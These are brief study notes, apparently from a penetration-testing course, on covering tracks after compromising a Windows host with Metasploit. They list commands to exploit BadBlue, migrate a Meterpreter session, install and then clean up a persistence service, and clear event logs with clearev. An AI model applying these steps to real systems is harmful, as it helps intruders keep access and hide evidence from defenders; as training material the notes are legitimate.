* A good practice: Store all your scripts, exploits and binaries in C:/Temp on windows ,,,, /tmp directory on Linux.
* One of the measures taken to clear the tracks on Windows --> **Delete the Windows Event log** --> Not recommended though as it stores a lot of important information and could raise suspicions.
* `use exploit/windows/http/badblue_passthru`
* `exploit`
* `pgrep explorer`
* `migrate [ID]`
* As per the recommendation:
* `mkdir Temp`

* If we are using this module, it will generate and upalod a payload to start a persistent service on the target, so we need to delete this, as it cannot be left behind.
* `use exploit/windows/local/persistence_service`
* this module alongwith its other tasks, also create a Cleanup script (resource script).
* So copy the path to this resource script.
* Then we can start the meterpreter session we generated earlier:
* `resource [path copied to the resource script]`

* Not rcommended **clearev**
* Inside meterpreter `clearev` --> Will raise suspicions.
